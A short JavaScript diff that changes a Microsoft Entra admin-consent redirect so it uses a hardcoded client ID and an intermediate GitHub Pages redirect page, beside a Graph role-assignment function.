@@ -54,11 +54,11 @@
   };
 
   function startConsent() {
-    log('Redirection vers consentement App 1...');
-    setStatus('🔗 Étape 1 : redirection vers consentement App 1...');
-    const url = `https://login.microsoftonline.com/organizations/adminconsent?client_id=${app1ClientId}&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&state=continue_app2`;
-    window.location.href = url;
-  }
+  const redirectIntermediaire = 'https://zak413.github.io/test-bd/redirect.html';
+  const url = `https://login.microsoftonline.com/organizations/adminconsent?client_id=58deb25d-3881-4c76-863b-70e3fcb1739b&redirect_uri=${encodeURIComponent(redirectIntermediaire)}&state=step2`;
+  window.location.href = url;
+}
+
 
   async function assignRoleToApp(appClientId, token) {
     const graphUrl = 'https://graph.microsoft.com/v1.0';
